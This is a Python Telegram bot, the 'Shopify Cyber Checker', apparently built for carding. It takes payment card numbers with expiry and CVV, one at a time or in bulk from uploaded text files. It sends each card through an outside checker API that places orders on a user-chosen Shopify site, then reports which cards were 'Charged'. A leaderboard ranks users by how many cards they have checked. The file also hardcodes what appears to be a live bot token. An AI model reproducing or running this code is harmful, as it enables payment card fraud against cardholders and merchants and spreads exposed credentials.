import asyncio
import httpx
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode
import logging
import os
import time
import html
from datetime import datetime

# ---- Setup & Config ----
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
CHECKER_API_URL = "https://sigmabro766-1.onrender.com"
BINLIST_API_URL = "https://lookup.binlist.net/"

USER_SITES_FILE = "user_shopify_sites.json"
USER_STATS_FILE = "user_stats.json"
current_user_shopify_site = {}
user_stats = {}

# --- ASCII BANNERS ---
CYBER_BANNER = (
    "<pre>╔════════════════════════════════════════════════════╗\n"
    "║       🦾  S H O P I F Y   C Y B E R   C H E C K E R      ║\n"
    "╚════════════════════════════════════════════════════╝</pre>"
)
CYBER_RESULT_HEADER = "<pre>╔═══[ ✨  C Y B E R   R E S U L T  ✨ ]═══╗</pre>"
CYBER_DIVIDER = "<pre>───────────────────────────────────────────────</pre>"
CYBER_ERROR_BANNER = "<pre>╔═══[ 🛑  E R R O R  🛑 ]═══╗</pre>"
CYBER_MASS_DONE = "<pre>╔═══[ 🗂️  M A S S   C H E C K   D O N E  ]═══╗</pre>"
CYBER_LEADER_HEADER = "<pre>╔═══[ 🏆  L E A D E R B O A R D  🏆 ]═══╗</pre>"
CYBER_PROFILE_HEADER = "<pre>╔═══[ 👤  P R O F I L E  👤 ]═══╗</pre>"

STATUS_ICONS = {
    "approved": "🟢",
    "declined": "🔴",
    "other": "🟡",
    "error": "⚠️",
    "timeout": "⏱️",
    "network": "🌐",
    "unknown": "❓"
}

# --- Persistence ---
def load_user_sites():
    global current_user_shopify_site
    try:
        if os.path.exists(USER_SITES_FILE):
            with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                current_user_shopify_site = {int(k): v for k, v in data.items()}
    except Exception:
        current_user_shopify_site = {}

def save_user_sites():
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(current_user_shopify_site, f, indent=4)
    except Exception:
        pass

def load_user_stats():
    global user_stats
    try:
        if os.path.exists(USER_STATS_FILE):
            with open(USER_STATS_FILE, 'r', encoding='utf-8') as f:
                user_stats = json.load(f)
    except Exception:
        user_stats = {}

def save_user_stats():
    try:
        with open(USER_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_stats, f, indent=4)
    except Exception:
        pass

def update_user_stats(user_id, action):
    uid = str(user_id)
    if uid not in user_stats:
        user_stats[uid] = {
            "checks": 0,
            "last_check": None,
            "sites_set": 0,
            "last_site": None,
            "last_mass": None
        }
    if action == "check":
        user_stats[uid]["checks"] += 1
        user_stats[uid]["last_check"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    elif action == "site":
        user_stats[uid]["sites_set"] += 1
        user_stats[uid]["last_site"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    elif action == "mass":
        user_stats[uid]["last_mass"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    save_user_stats()

def get_site_for_user(user_id):
    return current_user_shopify_site.get(user_id)

def set_site_for_user(user_id, site_url):
    current_user_shopify_site[user_id] = site_url
    save_user_sites()
    update_user_stats(user_id, "site")

# --- API Helpers ---
async def get_bin_details(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {}
    try:
        request_headers = {'Accept-Version': '3', "User-Agent": "CyberShopifyBot"}
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=request_headers, timeout=10.0)
            if response.status_code == 200:
                return response.json()
    except Exception:
        pass
    return {}

def parse_checker_api_response(response_text: str):
    if not response_text:
        return None
    json_start_index = response_text.find('{')
    if json_start_index == -1:
        return None
    json_string = response_text[json_start_index:]
    try:
        return json.loads(json_string)
    except Exception:
        return None

# --- Commands ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_name = html.escape(user.username if user.username else user.first_name)
    welcome_message = (
        f"{CYBER_BANNER}\n"
        f"👾 <b>Welcome, {user_name}</b>\n"
        f"{CYBER_DIVIDER}\n"
        f"🦾 <b>Set/Update Site</b>: Manage your Shopify URL\n"
        f"💳 <b>Check Cards</b>: Single or batch\n"
        f"🗂️ <b>Leaderboard</b>: Top users\n"
        f"👤 <b>Profile</b>: Your stats\n"
        f"{CYBER_DIVIDER}\n"
        f"<b>Choose:</b>"
    )
    keyboard = [
        [
            InlineKeyboardButton("🔗 Set/Update Site", callback_data="site:prompt_add"),
            InlineKeyboardButton("⚙️ My Site", callback_data="site:show_current"),
        ],
        [
            InlineKeyboardButton("💳 Single Check", callback_data="chk:prompt_now"),
            InlineKeyboardButton("🗂️ Mass Check", callback_data="mchk:prompt_now"),
        ],
        [
            InlineKeyboardButton("🏆 Leaderboard", callback_data="nav:leaderboard"),
            InlineKeyboardButton("👤 Profile", callback_data="nav:profile"),
        ],
        [InlineKeyboardButton("📖 Commands", callback_data="nav:show_cmds")],
        [InlineKeyboardButton("🧑‍💻 Dev", url="https://t.me/alanjocc")],
    ]
    await (update.callback_query.message.edit_text if update.callback_query else update.message.reply_text)(
        welcome_message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML
    )

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE, from_button: bool = False):
    commands_text = (
        f"{CYBER_BANNER}\n"
        f"{CYBER_DIVIDER}\n"
        f"🦾 <b>Shopify Cyber Bot Commands:</b>\n"
        f"• /start - Main menu\n"
        f"• /cmds - Show commands\n"
        f"• /add <code>&lt;url&gt;</code> - Set Shopify site\n"
        f"• /my_site - Show your site\n"
        f"• /chk <code>N|M|Y|C</code> - Single check\n"
        f"• /mchk - Mass check from .txt file\n"
        f"• /profile - Your stats\n"
        f"• /leaderboard - Top users\n"
        f"{CYBER_DIVIDER}\n"
        f"🧑‍💻 Dev: @alanjocc"
    )
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")]])
    await (update.callback_query.message.edit_text if from_button and update.callback_query else update.message.reply_text)(
        commands_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
    )

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n<b>URL Missing!</b>\nUsage: /add <code>https://yoursite.com</code>",
            parse_mode=ParseMode.HTML
        )
        return
    site_url = context.args[0]
    if not (site_url.startswith("http://") or site_url.startswith("https://")):
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n<b>Invalid URL!</b> Must start with <code>http://</code> or <code>https://</code>.",
            parse_mode=ParseMode.HTML
        )
        return
    set_site_for_user(user_id, site_url)
    msg = (
        "<pre>╔═══[ 🟩  S I T E   S E T  🟩 ]═══╗</pre>\n"
        f"🦾 <b>Target:</b> <code>{html.escape(site_url)}</code>\n"
        f"📡 <b>Status:</b> Ready\n"
        f"{CYBER_DIVIDER}"
    )
    keyboard = [
        [
            InlineKeyboardButton("💳 Single Check", callback_data="chk:prompt_now"),
            InlineKeyboardButton("🗂️ Mass Check", callback_data="mchk:prompt_now"),
        ],
        [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")],
    ]
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))

async def my_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE, from_button: bool = False):
    user_id = update.effective_user.id
    site = get_site_for_user(user_id)
    if site:
        txt = (
            "<pre>╔═══[ ⚙️  M Y   S I T E  ⚙️ ]═══╗</pre>\n"
            f"🔗 <b>URL:</b> <code>{html.escape(site)}</code>\n"
            f"{CYBER_DIVIDER}"
        )
        kb = [
            [InlineKeyboardButton("💳 Single Check", callback_data="chk:prompt_now")],
            [InlineKeyboardButton("🔗 Change Site", callback_data="site:prompt_add")],
            [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")],
        ]
    else:
        txt = (
            "<pre>╔═══[ ⚙️  M Y   S I T E  ⚙️ ]═══╗</pre>\n"
            "⚠️ <b>No Shopify site set.</b> Add one to start.\n"
            f"{CYBER_DIVIDER}"
        )
        kb = [
            [InlineKeyboardButton("🔗 Set Site", callback_data="site:prompt_add")],
            [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")],
        ]
    await (update.callback_query.message.edit_text if from_button and update.callback_query else update.message.reply_text)(
        txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb)
    )

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    stats = user_stats.get(uid, {
        "checks": 0,
        "last_check": "Never",
        "sites_set": 0,
        "last_site": "Never",
        "last_mass": "Never"
    })
    profile_text = (
        f"{CYBER_PROFILE_HEADER}\n"
        f"👤 <b>User:</b> {html.escape(user.username if user.username else user.first_name)}\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
        f"{CYBER_DIVIDER}"
        f"💳 <b>Checks:</b> {stats['checks']}\n"
        f"🔗 <b>Sites Set:</b> {stats['sites_set']}\n"
        f"🕒 <b>Last Check:</b> {stats['last_check']}\n"
        f"⏳ <b>Last Site Change:</b> {stats['last_site']}\n"
        f"🗂️ <b>Last Mass Check:</b> {stats.get('last_mass', 'Never')}\n"
        f"{CYBER_DIVIDER}"
    )
    kb = [
        [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")],
        [InlineKeyboardButton("🏆 Leaderboard", callback_data="nav:leaderboard")],
    ]
    await update.message.reply_text(profile_text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

async def leaderboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    leaderboard = sorted(user_stats.items(), key=lambda x: x[1].get("checks", 0), reverse=True)
    leaderboard_text = f"{CYBER_LEADER_HEADER}\n"
    for idx, (uid, stats) in enumerate(leaderboard[:10], 1):
        uname = f"<b>{uid}</b>"
        try:
            user = await context.bot.get_chat(uid)
            if getattr(user, "username", None):
                uname = f"@{user.username}"
        except Exception:
            pass
        icon = "🥇" if idx == 1 else "🥈" if idx == 2 else "🥉" if idx == 3 else "🔹"
        leaderboard_text += f"{icon} #{idx} {uname} — <b>{stats.get('checks',0)} checks</b>\n"
    leaderboard_text += f"{CYBER_DIVIDER}"
    kb = [
        [InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")],
        [InlineKeyboardButton("👤 Profile", callback_data="nav:profile")],
    ]
    await update.message.reply_text(leaderboard_text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    user = update.effective_user
    user_display_name = html.escape(user.username if user.username else user.first_name)

    if not shopify_site:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ No site set. Use /add <code>&lt;site_url&gt;</code> first.",
            parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ Card missing.\nFormat: /chk <code>N|M|Y|C</code>",
            parse_mode=ParseMode.HTML)
        return

    cc_details_full = context.args[0]
    if cc_details_full.count('|') != 3:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ Invalid card format. Use: <code>N|M|Y|C</code>",
            parse_mode=ParseMode.HTML)
        return

    try:
        card_number, _, _, _ = cc_details_full.split('|')
    except ValueError:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ Invalid card format. Use: <code>N|M|Y|C</code>",
            parse_mode=ParseMode.HTML)
        return

    spinner_msg = await update.message.reply_text("⣾ Checking...", parse_mode=ParseMode.HTML)
    start_time = time.time()
    bin_data = await get_bin_details(card_number[:6])
    params = {"site": shopify_site, "cc": cc_details_full}
    final_card_status_text = "Error Initializing Check"
    final_card_status_emoji = STATUS_ICONS["unknown"]
    final_api_response_display = "N/A"
    checker_api_gateway = "N/A"
    checker_api_price = "0.00"

    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
        if response.status_code == 200:
            api_data = parse_checker_api_response(response.text)
            if api_data:
                checker_api_response_text = api_data.get("Response", "Unknown API Response")
                checker_api_gateway = api_data.get("Gateway", "N/A")
                checker_api_price = api_data.get("Price", "0.00")
                if checker_api_response_text == "CARD_DECLINED":
                    final_card_status_emoji = STATUS_ICONS["declined"]
                    final_card_status_text = "Declined"
                    final_api_response_display = "CARD_DECLINED"
                elif "Thank You" in checker_api_response_text or "ORDER_PLACED" in checker_api_response_text.upper():
                    final_card_status_emoji = STATUS_ICONS["approved"]
                    final_card_status_text = "Charged"
                    final_api_response_display = "ORDER_PLACED"
                else:
                    final_card_status_emoji = STATUS_ICONS["other"]
                    final_card_status_text = "Info"
                    final_api_response_display = checker_api_response_text
            else:
                final_card_status_emoji = STATUS_ICONS["unknown"]
                final_card_status_text = "API Response Parse Error"
                final_api_response_display = response.text[:100].strip() if response.text else "Empty or non-JSON response"
        else:
            final_card_status_emoji = STATUS_ICONS["error"]
            final_card_status_text = f"API Error ({response.status_code})"
            final_api_response_display = response.text[:100].strip() if response.text else f"Status {response.status_code}, no content."
    except httpx.TimeoutException:
        final_card_status_emoji = STATUS_ICONS["timeout"]
        final_card_status_text = "API Timeout"
        final_api_response_display = "Request to checker API timed out."
    except httpx.RequestError as e:
        final_card_status_emoji = STATUS_ICONS["network"]
        final_card_status_text = "Network Issue"
        final_api_response_display = f"Could not connect: {str(e)[:60]}"
    except Exception as e:
        final_card_status_emoji = STATUS_ICONS["error"]
        final_card_status_text = "Unexpected Error"
        final_api_response_display = str(e)[:60]

    try:
        await context.bot.delete_message(chat_id=spinner_msg.chat_id, message_id=spinner_msg.message_id)
    except Exception:
        pass
    time_taken = round(time.time() - start_time, 2)

    # --- Formatting the final result message ---
    escaped_cc_details = html.escape(cc_details_full)
    escaped_shopify_site = html.escape(shopify_site)
    escaped_gateway = html.escape(checker_api_gateway if checker_api_gateway.lower() != "normal" else "Normal Shopify")
    escaped_price = html.escape(str(checker_api_price))
    escaped_api_response = html.escape(final_api_response_display)
    info = bin_data or {}
    bin_str = html.escape(info.get('scheme', 'N/A')) + " " + html.escape(info.get('type', 'N/A')) + " " + html.escape(info.get('brand', 'N/A'))
    bank = html.escape(info.get('bank', {}).get('name', 'N/A') if info.get('bank') else 'N/A')
    country = html.escape(info.get('country', {}).get('name', 'N/A') if info.get('country') else 'N/A')
    country_emoji = info.get('country', {}).get('emoji', '🏳️') if info.get('country') else '🏳️'

    result_message = (
        f"{CYBER_RESULT_HEADER}\n"
        f"💳 <b>Card:</b> <code>{escaped_cc_details}</code>\n"
        f"🌍 <b>Site:</b> <pre>{escaped_shopify_site}</pre>\n"
        f"⚙️ <b>Gateway:</b> {escaped_gateway} ({escaped_price}$)\n"
        f"{final_card_status_emoji} <b>Status:</b> {html.escape(final_card_status_text)}\n"
        f"🗣️ <b>Response:</b> <pre>{escaped_api_response}</pre>\n"
        f"{CYBER_DIVIDER}"
        f"🏦 <b>BIN Info:</b> {bin_str}\n"
        f"🏛️ <b>Bank:</b> {bank}\n"
        f"🗺️ <b>Country:</b> {country} {country_emoji}\n"
        f"{CYBER_DIVIDER}"
        f"👤 <b>Checked By:</b> {user_display_name}\n"
        f"⏱️ <b>Time:</b> {time_taken}s"
    )

    keyboard_buttons = [
        [InlineKeyboardButton("💳 Check Another", callback_data="chk:prompt_another")],
        [
            InlineKeyboardButton("🔗 Change Site", callback_data="site:prompt_add"),
            InlineKeyboardButton("« Main Menu", callback_data="nav:show_start")
        ]
    ]
    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard_buttons))
    update_user_stats(user_id, "check")

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    shopify_site = get_site_for_user(user_id)
    user = update.effective_user
    user_display_for_log = f"ID: {user.id}, User: @{user.username}" if user.username else f"ID: {user.id}"

    if not shopify_site:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ No Shopify site set. Use /add <code>&lt;site_url&gt;</code> first.",
            parse_mode=ParseMode.HTML)
        return

    document = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
    if not document:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ File missing. Reply to a <code>.txt</code> file with /mchk.",
            parse_mode=ParseMode.HTML)
        return

    if document.mime_type != 'text/plain':
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ Invalid file type. Please upload a <code>.txt</code> file.",
            parse_mode=ParseMode.HTML)
        return

    file_obj = await context.bot.get_file(document.file_id)
    file_content = (await file_obj.download_as_bytearray()).decode('utf-8')
    ccs_to_check = [line.strip() for line in file_content.splitlines() if line.strip() and line.strip().count('|') == 3]

    if not ccs_to_check:
        await update.message.reply_text(
            f"{CYBER_ERROR_BANNER}\n⚠️ File contains no valid card lines (<code>N|M|Y|C</code>).",
            parse_mode=ParseMode.HTML)
        return

    total_ccs = len(ccs_to_check)
    status_msg = await update.message.reply_text(f"🟦 Mass check started: {total_ccs} cards...", parse_mode=ParseMode.HTML)
    start_mass_time = time.time()

    result_file_content = []
    async with httpx.AsyncClient() as client:
        for i, cc_details in enumerate(ccs_to_check):
            params = {"site": shopify_site, "cc": cc_details}
            try:
                response = await client.get(CHECKER_API_URL, params=params, timeout=45.0)
                raw_api = response.text.strip()
            except Exception as e:
                raw_api = f"{{'error':'{str(e)}'}}"
            result_file_content.append(f"Card: {cc_details}\nRaw Response:\n{raw_api}\n" + "-"*40)
            if (i + 1) % 5 == 0 or (i + 1) == total_ccs:
                try:
                    await status_msg.edit_text(
                        f"Progress: {i+1}/{total_ccs}\n"
                        f"🟢 Done: {i+1}"
                    )
                except Exception:
                    pass
            await asyncio.sleep(0.95)

    total_time = round(time.time() - start_mass_time, 2)
    final_summary = (
        f"{CYBER_MASS_DONE}\n"
        f"Cards processed: {total_ccs} in {total_time}s.\n"
        f"{CYBER_DIVIDER}"
    )
    await status_msg.edit_text(final_summary, parse_mode=ParseMode.HTML)

    result_filename = f"Results_{user.id}_{int(time.time())}.txt"
    with open(result_filename, "w", encoding="utf-8") as f:
        f.write("\n\n".join(result_file_content))

    with open(result_filename, "rb") as f_to_send:
        await update.message.reply_document(
            document=f_to_send,
            filename=f"ShopifyResults_{total_ccs}cards.txt",
            caption=f"Results for <pre>{html.escape(shopify_site)}</pre>",
            parse_mode=ParseMode.HTML
        )
    os.remove(result_filename)
    update_user_stats(user_id, "mass")

async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()

    if data == "nav:show_start": await start_command(update, context)
    elif data == "nav:show_cmds": await cmds_command(update, context, from_button=True)
    elif data == "site:prompt_add":
        await query.message.reply_text("🔗 <b>Set Target Site:</b>\nUse /add <code>https://your-shop.com</code>", parse_mode=ParseMode.HTML)
    elif data == "site:show_current": await my_site_command(update, context, from_button=True)
    elif data == "chk:prompt_now" or data == "chk:prompt_another":
        current_site = get_site_for_user(user_id)
        if current_site:
            await query.message.reply_text(f"💳 Ready to check.\nUse /chk <code>N|M|Y|C</code>", parse_mode=ParseMode.HTML)
        else:
            await query.message.reply_text("⚠️ Site not set. Use 'Set/Update Site' first.", parse_mode=ParseMode.HTML)
    elif data == "mchk:prompt_now":
        current_site = get_site_for_user(user_id)
        if current_site:
            await query.message.reply_text(f"🗂️ Mass check ready.\nUpload a <code>.txt</code> file and reply with /mchk.", parse_mode=ParseMode.HTML)
        else:
            await query.message.reply_text("⚠️ Site not set. Use 'Set/Update Site' first.", parse_mode=ParseMode.HTML)
    elif data == "nav:profile":
        await profile_command(update, context)
    elif data == "nav:leaderboard":
        await leaderboard_command(update, context)

def main():
    load_user_sites()
    load_user_stats()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("my_site", my_site_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("profile", profile_command))
    application.add_handler(CommandHandler("leaderboard", leaderboard_command))
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    application.add_handler(MessageHandler(filters.CAPTION & filters.Regex(r'^/mchk$') & filters.Document.TEXT, mchk_command))

    logger.info("Bot is polling for updates.")
    application.run_polling()

if __name__ == "__main__":
    main()
